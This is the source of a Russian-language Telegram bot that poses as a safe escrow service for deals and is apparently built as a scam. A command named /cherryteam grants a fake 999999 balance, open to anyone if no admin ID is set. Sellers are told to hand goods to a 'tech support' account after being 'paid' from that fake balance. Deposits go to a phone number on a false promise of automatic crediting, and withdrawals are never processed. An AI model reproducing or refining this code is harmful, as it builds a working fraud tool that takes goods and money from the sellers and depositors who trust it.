// index.js
require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const { Pool } = require('pg');

// ========== Проверка окружения ==========
if (!process.env.BOT_TOKEN) {
  console.error('Ошибка: BOT_TOKEN не задан в .env');
  process.exit(1);
}
if (!process.env.DATABASE_URL) {
  console.error('Ошибка: DATABASE_URL не задан в .env');
  process.exit(1);
}

// Минимальная сумма вывода (руб)
const MIN_AMOUNT = Number(process.env.MIN_AMOUNT || 10000);

// Инициализация бота и БД
const bot = new Telegraf(process.env.BOT_TOKEN);
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Изображения
const IMAGES = {
  main: 'https://i.ibb.co/JjTY2k5w/image.jpg',
  deal: 'https://i.ibb.co/7N4dmwFQ/image.jpg',
  settings: 'https://i.ibb.co/JjTY2k5w/image.jpg'
};

// ======= Вспомогательные функции =======
function replyWithKeyboardOptions(inlineKeyboard) {
  return { reply_markup: { inline_keyboard: inlineKeyboard } };
}

function getStatusText(status) {
  const statuses = {
    'active': '🟢 Активна',
    'waiting_payment': '🟡 Ожидает оплаты',
    'paid': '🔵 Оплачена',
    'completed': '✅ Завершена',
    'cancelled': '🔴 Отменена'
  };
  return statuses[status] || status;
}

async function ensureUser(ctx) {
  if (!ctx || !ctx.from) return;
  try {
    await pool.query(
      'INSERT INTO users (user_id, username) VALUES ($1, $2) ON CONFLICT (user_id) DO NOTHING',
      [ctx.from.id, ctx.from.username || null]
    );
  } catch (e) {
    console.error('ensureUser error:', e);
  }
}

// ======= Инициализация БД (таблицы) =======
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        user_id BIGINT PRIMARY KEY,
        username TEXT,
        balance DECIMAL DEFAULT 0,
        successful_deals INTEGER DEFAULT 0,
        is_banned BOOLEAN DEFAULT FALSE,
        requisites TEXT,
        created_at TIMESTAMP DEFAULT NOW()
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS deals (
        deal_id TEXT PRIMARY KEY,
        seller_id BIGINT NOT NULL,
        buyer_id BIGINT,
        product_info TEXT,
        amount DECIMAL DEFAULT 1000,
        currency TEXT DEFAULT 'RUB',
        deal_link TEXT NOT NULL,
        status TEXT DEFAULT 'active',
        seller_confirmed BOOLEAN DEFAULT FALSE,
        buyer_confirmed BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT NOW()
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS withdrawals (
        id SERIAL PRIMARY KEY,
        user_id BIGINT NOT NULL,
        requisites TEXT NOT NULL,
        amount DECIMAL NOT NULL,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT NOW()
      );
    `);

    console.log('✅ База готова');
  } catch (e) {
    console.error('❌ Ошибка инициализации БД:', e);
  }
}

// ======= Middleware: регистрация пользователя и проверка бана =======
bot.use(async (ctx, next) => {
  try {
    if (ctx.from && ctx.from.id) {
      await ensureUser(ctx);
      const res = await pool.query('SELECT is_banned FROM users WHERE user_id = $1', [ctx.from.id]);
      if (res.rows[0]?.is_banned) {
        try {
          return await ctx.reply('🚫 Вы заблокированы и не можете пользоваться ботом.');
        } catch (e) {
          return;
        }
      }
    }
  } catch (e) {
    console.error('Middleware error:', e);
  }
  return next();
});

// ======= Главное меню =======
async function showMainMenu(ctx) {
  const caption = `👋 Добро пожаловать!\n\n💼 Надёжный сервис для безопасных сделок!\n✨ Автоматизировано, быстро и без лишних хлопот!\n\n🔹 Никакой комиссии\n🔹 Поддержка 24/7\n\n💌 Теперь ваши сделки под защитой! 🛡`;

  const keyboard = [
    [{ text: '🌏 Открыть в приложении', web_app: { url: 'https://example.com' } }],
    [{ text: '📁 Мои сделки', callback_data: 'my_deals' }],
    [{ text: '⚙️ Настройки', callback_data: 'settings' }]
  ];

  try {
    await ctx.replyWithPhoto(IMAGES.main, {
      caption,
      parse_mode: 'Markdown',
      ...replyWithKeyboardOptions(keyboard)
    });
  } catch (e) {
    console.error('showMainMenu reply error:', e);
    await ctx.reply(caption, replyWithKeyboardOptions(keyboard));
  }
}

// ======= /start =======
bot.start(async (ctx) => {
  try {
    await ensureUser(ctx);

    const payload = ctx.startPayload;
    if (payload && payload.startsWith('deal_')) {
      const dealId = payload.replace('deal_', '');
      const dealRes = await pool.query('SELECT * FROM deals WHERE deal_id = $1', [dealId]);

      if (dealRes.rows.length === 0) {
        await ctx.reply('❌ Сделка не найдена');
        return showMainMenu(ctx);
      }

      const d = dealRes.rows[0];
      if (d.seller_id === ctx.from.id) {
        await ctx.reply(`🔗 Это ваша сделка #${dealId}`);
        return showMainMenu(ctx);
      }

      const sellerRes = await pool.query('SELECT username, successful_deals FROM users WHERE user_id = $1', [d.seller_id]);
      const sellerInfo = sellerRes.rows[0] || {};

      try {
        await bot.telegram.sendMessage(
          d.seller_id,
          `👤 Новый покупатель!\n\nПокупатель зашел в сделку #${dealId}\n\nID: ${ctx.from.id}\nUsername: @${ctx.from.username || 'нет'}\nИмя: ${ctx.from.first_name || ''}`
        );
      } catch (e) {
        console.warn('Не удалось уведомить продавца:', e.message);
      }

      const amountNum = Number(d.amount) || 0;
      const tonAmount = (amountNum / 180).toFixed(4);
      const usdtAmount = (amountNum / 90).toFixed(2);

      const caption = `📋 Информация о сделке #${dealId}\n\n👤 Вы покупатель в сделке.\n📌 Продавец: ${sellerInfo?.username || 'ID:' + d.seller_id}\n╰ Успешные сделки: ${sellerInfo?.successful_deals || 0}\n\n💰 Сумма сделки: ${amountNum} RUB\n📜 Вы покупаете: ${d.product_info || 'Товар/услуга'}\n\n💎 Сумма к оплате в TON: ${tonAmount}\n💵 Сумма к оплате в USDT(TON): ${usdtAmount}\n📝 Комментарий к платежу (мемо): ${dealId}\n\n⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!`;

      const keyboard = [
        [{ text: '💳 Оплатить с баланса', callback_data: `pay_${dealId}` }],
        [{ text: '⏪ Главное меню', callback_data: 'main_menu' }]
      ];

      await ctx.replyWithPhoto(IMAGES.deal, {
        caption,
        parse_mode: 'Markdown',
        ...replyWithKeyboardOptions(keyboard)
      });
      return;
    }

    await showMainMenu(ctx);
  } catch (e) {
    console.error('/start handler error:', e);
    await ctx.reply('❌ Ошибка при обработке стартa.');
  }
});

// ======= Создание сделки (/create) =======
bot.command('create', async (ctx) => {
  try {
    await ensureUser(ctx);

    const dealId = Math.random().toString(36).substring(2, 10).toUpperCase();
    const dealLink = `https://t.me/${ctx.botInfo.username}?start=deal_${dealId}`;

    await pool.query('INSERT INTO deals (deal_id, seller_id, deal_link) VALUES ($1, $2, $3)', [
      dealId,
      ctx.from.id,
      dealLink
    ]);

    const caption = `💥 Сделка успешно создана!\n\nТип сделки: Общая\n\nОтдаете: \nПолучаете: \n\n⛓️ Ссылка для покупателя:\n${dealLink}`;

    await ctx.replyWithPhoto(IMAGES.deal, {
      caption,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('create error:', e);
    await ctx.reply('❌ Ошибка при создании сделки.');
  }
});

// ======= Мои сделки =======
bot.action('my_deals', async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    const res = await pool.query('SELECT * FROM deals WHERE seller_id = $1 OR buyer_id = $1 ORDER BY created_at DESC', [ctx.from.id]);

    if (res.rows.length === 0) {
      await ctx.reply('📭 У вас пока нет сделок');
      return;
    }

    const rows = res.rows.map(deal => [{ text: `#${deal.deal_id} - ${getStatusText(deal.status)}`, callback_data: `deal_${deal.deal_id}` }]);
    rows.push([{ text: '⏪ Назад', callback_data: 'main_menu' }]);

    await ctx.reply('📁 Ваши сделки:', replyWithKeyboardOptions(rows));
  } catch (e) {
    console.error('my_deals error:', e);
    await ctx.reply('❌ Ошибка при получении сделок.');
  }
});

// ======= Детали сделки =======
bot.action(/deal_(.+)/, async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    const dealId = ctx.match[1];
    const res = await pool.query('SELECT * FROM deals WHERE deal_id = $1', [dealId]);
    if (res.rows.length === 0) {
      await ctx.reply('❌ Сделка не найдена');
      return;
    }

    const d = res.rows[0];
    const role = d.seller_id === ctx.from.id ? '👤 Продавец' : '👥 Покупатель';

    let otherPartyInfo = '';
    if (d.buyer_id && d.seller_id === ctx.from.id) {
      const buyer = await pool.query('SELECT username, successful_deals FROM users WHERE user_id = $1', [d.buyer_id]);
      otherPartyInfo = `👥 Покупатель: ${buyer.rows[0]?.username || 'ID:' + d.buyer_id}\n✅ Сделок: ${buyer.rows[0]?.successful_deals || 0}`;
    } else if (d.seller_id && d.buyer_id === ctx.from.id) {
      const seller = await pool.query('SELECT username, successful_deals FROM users WHERE user_id = $1', [d.seller_id]);
      otherPartyInfo = `👤 Продавец: ${seller.rows[0]?.username || 'ID:' + d.seller_id}\n✅ Сделок: ${seller.rows[0]?.successful_deals || 0}`;
    }

    const caption = `📋 Сделка #${d.deal_id}\n\n${role}\n${otherPartyInfo}\n💰 Сумма: ${d.amount} ${d.currency}\n📝 ${d.product_info || 'Описание не указано'}\n📊 Статус: ${getStatusText(d.status)}\n🔗 ${d.deal_link}`;

    const keyboard = [[{ text: '⏪ Назад к сделкам', callback_data: 'my_deals' }]];

    await ctx.reply(caption, replyWithKeyboardOptions(keyboard));
  } catch (e) {
    console.error('deal details error:', e);
    await ctx.reply('❌ Ошибка при получении деталей сделки.');
  }
});

// ======= Настройки =======
bot.action('settings', async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    const res = await pool.query('SELECT balance, requisites FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = res.rows[0]?.balance || 0;
    const requisites = res.rows[0]?.requisites;

    let caption = `⚙️ Настройки\n\n💰 Баланс: ${balance}₽\n`;
    caption += requisites ? `💳 Реквизиты: указаны\n` : `💳 Реквизиты: не указаны\n`;

    const keyboard = [
      [{ text: '💰 Баланс', callback_data: 'balance_menu' }],
      [{ text: '💳 Реквизиты', callback_data: 'requisites_menu' }],
      [{ text: '⏪ Назад', callback_data: 'main_menu' }]
    ];

    await ctx.replyWithPhoto(IMAGES.settings, {
      caption,
      parse_mode: 'Markdown',
      ...replyWithKeyboardOptions(keyboard)
    });
  } catch (e) {
    console.error('settings error:', e);
    await ctx.reply('❌ Ошибка в настройках.');
  }
});

// ======= Реквизиты =======
bot.action('requisites_menu', async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    const res = await pool.query('SELECT requisites FROM users WHERE user_id = $1', [ctx.from.id]);
    const requisites = res.rows[0]?.requisites;

    let caption = '💳 Ваши реквизиты\n\n';
    caption += requisites ? `${requisites}\n\n` : 'Реквизиты не указаны\n\n';
    caption += 'Отправьте новые реквизиты в формате:\nКарта: 1234 5678 9012 3456\nТелефон: +79991234567';

    await ctx.reply(caption);
  } catch (e) {
    console.error('requisites_menu error:', e);
    await ctx.reply('❌ Ошибка при показе реквизитов.');
  }
});

// ======= Баланс =======
bot.action('balance_menu', async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    const res = await pool.query('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = res.rows[0]?.balance || 0;

    const caption = `💰 Баланс: ${balance}₽\n\nВыберите действие:`;
    const keyboard = [
      [{ text: '📥 Пополнить', callback_data: 'deposit' }],
      [{ text: '📤 Вывести', callback_data: 'withdraw' }],
      [{ text: '⏪ Назад', callback_data: 'settings' }]
    ];

    await ctx.reply(caption, replyWithKeyboardOptions(keyboard));
  } catch (e) {
    console.error('balance_menu error:', e);
    await ctx.reply('❌ Ошибка при показе баланса.');
  }
});

// ======= Пополнение =======
bot.action('deposit', async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    await ctx.reply(`📥 Пополнение баланса\n\nМинимальная сумма пополнения — ${MIN_AMOUNT}₽.\n\nОтправьте сумму на:\n📞 89202555790\n💳 Юмани\n\nПосле оплаты баланс пополнится автоматически.`);
  } catch (e) {
    console.error('deposit error:', e);
    await ctx.reply('❌ Ошибка в пополнении.');
  }
});

// ======= Вывод =======
bot.action('withdraw', async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    const res = await pool.query('SELECT balance, requisites FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = Number(res.rows[0]?.balance) || 0;
    const requisites = res.rows[0]?.requisites;

    let caption = `📤 Вывод средств\n\n💰 Ваш баланс: ${balance}₽\n`;
    if (requisites) caption += `💳 Ваши реквизиты: ${requisites}\n\n`;
    caption += `Введите реквизиты и сумму для вывода:\n\nПример:\nКарта: 1234 5678 9012 3456\nСумма: ${MIN_AMOUNT}`;

    await ctx.reply(caption);
  } catch (e) {
    console.error('withdraw action error:', e);
    await ctx.reply('❌ Ошибка при выводе.');
  }
});

// ======= Обработка текстовых сообщений (реквизиты и вывод) =======
bot.on('text', async (ctx) => {
  try {
    const text = ctx.message.text;
    if (text.startsWith('/')) return;

    // Сохранение реквизитов
    if (text.includes('Карта:') || text.includes('Телефон:') || text.includes('Крипто:')) {
      await pool.query('UPDATE users SET requisites = $1 WHERE user_id = $2', [text, ctx.from.id]);
      await ctx.reply('✅ Реквизиты сохранены!');
      return;
    }

    // Поиск суммы
    const sumMatch = text.match(/[Сс]умма:\s*([\d\s]+)/) || text.match(/(\d+)\s*[Рр]?/);
    const amount = sumMatch ? parseInt(sumMatch[1].toString().replace(/\s+/g, ''), 10) : 0;

    if (amount && amount >= MIN_AMOUNT) {
      const userRes = await pool.query('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
      const balance = Number(userRes.rows[0]?.balance) || 0;

      if (amount <= balance) {
        await pool.query('INSERT INTO withdrawals (user_id, requisites, amount) VALUES ($1, $2, $3)', [
          ctx.from.id,
          text,
          amount
        ]);
        await pool.query('UPDATE users SET balance = balance - $1 WHERE user_id = $2', [amount, ctx.from.id]);

        await ctx.reply(`✅ Заявка на вывод ${amount}₽ создана! Ожидайте обработки.`);
      } else {
        await ctx.reply('❌ Недостаточно средств для вывода.');
      }
      return;
    } else if (amount && amount < MIN_AMOUNT) {
      await ctx.reply(`⚠️ Минимальная сумма вывода — ${MIN_AMOUNT}₽.`);
      return;
    }

    await ctx.reply('📌 Я получил ваше сообщение. Если вы отправляете реквизиты — укажите "Карта:", "Телефон:" или "Крипто:". Для вывода укажите "Сумма: <число>".');
  } catch (e) {
    console.error('text handler error:', e);
    await ctx.reply('❌ Ошибка при обработке сообщения.');
  }
});

// ======= Назад в меню =======
bot.action('main_menu', async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    await ctx.deleteMessage().catch(() => {});
    await showMainMenu(ctx);
  } catch (e) {
    console.error('main_menu error:', e);
    await showMainMenu(ctx);
  }
});

// ======= Оплата с баланса =======
bot.action(/pay_(.+)/, async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    const dealId = ctx.match[1];
    const dealRes = await pool.query('SELECT * FROM deals WHERE deal_id = $1', [dealId]);
    if (dealRes.rows.length === 0) {
      await ctx.answerCbQuery('❌ Сделка не найдена');
      return;
    }
    const d = dealRes.rows[0];

    const buyerRes = await pool.query('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const buyerBalance = Number(buyerRes.rows[0]?.balance) || 0;
    const amount = Number(d.amount) || 0;

    if (buyerBalance < amount) {
      await ctx.answerCbQuery('❌ Недостаточно средств');
      return;
    }

    await pool.query('BEGIN');
    try {
      await pool.query('UPDATE users SET balance = balance - $1 WHERE user_id = $2', [amount, ctx.from.id]);
      await pool.query('UPDATE deals SET status = $1, buyer_id = $2 WHERE deal_id = $3', ['paid', ctx.from.id, dealId]);
      await pool.query('COMMIT');
    } catch (e) {
      await pool.query('ROLLBACK');
      throw e;
    }

    const buyerInfo = `ID: ${ctx.from.id}\nUsername: @${ctx.from.username || 'нет'}\nИмя: ${ctx.from.first_name || ''}`;
    try {
      await bot.telegram.sendMessage(
        d.seller_id,
        `💰 Покупатель оплатил товар!\n\nИнформация о покупателе:\n${buyerInfo}\n\nВАЖНО: ПЕРЕДАВАЙТЕ ТОВАР НА АККАУНТ ТЕХ.ПОДДЕРЖКИ @GiftSupported\n\nПосле передачи товара, не забудьте подтвердить передачу.`,
        {
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: [[{ text: '✅ Подтвердить передачу', callback_data: `confirm_seller_${dealId}` }]] }
        }
      );
    } catch (e) {
      console.warn('Не удалось уведомить продавца о платеже:', e.message);
    }

    await ctx.answerCbQuery('✅ Оплата выполнена');
    await ctx.reply('✅ Сделка оплачена! Ожидайте передачи товара.');
  } catch (e) {
    console.error('pay action error:', e);
    await ctx.reply('❌ Ошибка при оплате.');
  }
});

// ======= Подтверждение передачи продавцом =======
bot.action(/confirm_seller_(.+)/, async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    const dealId = ctx.match[1];

    await pool.query('UPDATE deals SET seller_confirmed = TRUE WHERE deal_id = $1', [dealId]);

    const dealRes = await pool.query('SELECT * FROM deals WHERE deal_id = $1', [dealId]);
    const d = dealRes.rows[0];
    if (!d) {
      await ctx.reply('❌ Сделка не найдена');
      return;
    }

    try {
      await bot.telegram.sendMessage(d.buyer_id, '🎁 Продавец передал товар! Подтвердите получение:', {
        reply_markup: { inline_keyboard: [[{ text: '✅ Подтвердить получение', callback_data: `confirm_buyer_${dealId}` }]] }
      });
    } catch (e) {
      console.warn('Не удалось уведомить покупателя о передаче:', e.message);
    }

    await ctx.reply('✅ Вы подтвердили передачу товара! Ожидайте подтверждения от покупателя.');
  } catch (e) {
    console.error('confirm_seller error:', e);
    await ctx.reply('❌ Ошибка при подтверждении передачи.');
  }
});

// ======= Подтверждение получения покупателем =======
bot.action(/confirm_buyer_(.+)/, async (ctx) => {
  try {
    await ctx.answerCbQuery().catch(() => {});
    const dealId = ctx.match[1];

    const dealRes = await pool.query('SELECT * FROM deals WHERE deal_id = $1', [dealId]);
    if (dealRes.rows.length === 0) {
      await ctx.answerCbQuery('❌ Сделка не найдена');
      return;
    }
    const d = dealRes.rows[0];

    await pool.query('BEGIN');
    try {
      await pool.query('UPDATE deals SET buyer_confirmed = TRUE, status = $1 WHERE deal_id = $2', ['completed', dealId]);
      await pool.query('UPDATE users SET balance = balance + $1, successful_deals = successful_deals + 1 WHERE user_id = $2', [
        d.amount,
        d.seller_id
      ]);
      await pool.query('COMMIT');
    } catch (e) {
      await pool.query('ROLLBACK');
      throw e;
    }

    try {
      await bot.telegram.sendMessage(d.seller_id, `✅ Покупатель подтвердил получение! Баланс пополнен на ${d.amount}₽`, {
        parse_mode: 'Markdown'
      });
    } catch (e) {
      console.warn('Не удалось уведомить продавца о завершении сделки:', e.message);
    }

    await ctx.reply('✅ Сделка завершена! Спасибо за покупку! 🛍️');
  } catch (e) {
    console.error('confirm_buyer error:', e);
    await ctx.reply('❌ Ошибка при подтверждении получения.');
  }
});

// ======= Админские команды =======
bot.command('cherryteam', async (ctx) => {
  try {
    const ownerId = Number(process.env.ADMIN_ID || 0);
    if (ownerId && ctx.from.id !== ownerId) return ctx.reply('Доступ запрещён');
    await pool.query('UPDATE users SET balance = 999999 WHERE user_id = $1', [ctx.from.id]);
    await ctx.reply('🍒 Бесконечный баланс активирован!');
  } catch (e) {
    console.error('cherryteam error:', e);
    await ctx.reply('❌ Ошибка при выполнении команды.');
  }
});

bot.command('ban', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ');
    if (!args[1]) return ctx.reply('Использование: /ban <user_id>');
    const ownerId = Number(process.env.ADMIN_ID || 0);
    if (ownerId && ctx.from.id !== ownerId) return ctx.reply('Доступ запрещён');
    const userId = args[1].trim();
    await pool.query('UPDATE users SET is_banned = TRUE WHERE user_id = $1', [userId]);
    await ctx.reply(`🚫 Пользователь ${userId} заблокирован`);
  } catch (e) {
    console.error('ban command error:', e);
    await ctx.reply('❌ Ошибка при блокировке пользователя.');
  }
});

bot.command('deals', async (ctx) => {
  try {
    const res = await pool.query(`
      SELECT d.*, seller.username as seller_username, buyer.username as buyer_username
      FROM deals d
      LEFT JOIN users seller ON d.seller_id = seller.user_id
      LEFT JOIN users buyer ON d.buyer_id = buyer.user_id
      ORDER BY created_at DESC LIMIT 10
    `);
    if (res.rows.length === 0) return ctx.reply('📭 Сделок нет');

    let text = '📊 Последние сделки:\n\n';
    res.rows.forEach(deal => {
      const seller = deal.seller_username ? `@${deal.seller_username}` : `ID:${deal.seller_id}`;
      const buyer = deal.buyer_id ? (deal.buyer_username ? `@${deal.buyer_username}` : `ID:${deal.buyer_id}`) : 'нет';
      text += `#${deal.deal_id} - ${seller} → ${buyer} - ${deal.status}\n`;
    });
    await ctx.reply(text);
  } catch (e) {
    console.error('deals command error:', e);
    await ctx.reply('❌ Ошибка при показе сделок.');
  }
});

// ======= Запуск =======
initDB().then(() => {
  bot.launch()
    .then(() => console.log('✅ Бот запущен!'))
    .catch(err => console.error('Ошибка при запуске бота:', err));
});

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
